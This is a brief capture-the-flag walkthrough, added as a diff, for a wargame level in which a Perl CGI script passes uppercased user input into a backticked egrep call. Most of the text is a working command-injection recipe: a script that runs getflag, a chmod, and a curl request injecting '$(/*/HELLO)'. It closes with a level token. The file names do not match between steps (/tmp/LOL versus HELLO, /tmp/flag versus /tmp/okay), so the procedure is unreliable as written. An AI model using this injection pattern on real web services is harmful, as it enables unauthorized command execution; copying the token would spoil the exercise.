@@ -1,0 +1,25 @@
+In your home, you have level12, a perl file
+
+The programm takes 2 arguments:
+
+$xx =~ tr/a-z/A-Z/; Set in uppercase
+$xx =~ s/\s.*//; Delete all spaces
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+Man egrep:
+
+-E, --extended-regexp
+Interpret PATTERN as an extended regular expression (ERE, see below). (-E is specified by POSIX .)
+
+create a file /tmp/LOL
+
+getflag > /tmp/flag
+
+chmod +x /tmp/LOL
+
+curl localhost:4646?x="\"\$(/*/HELLO)\""
+(second argument is useless in this case)
+
+Get the token:
+cat /tmp/okay
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
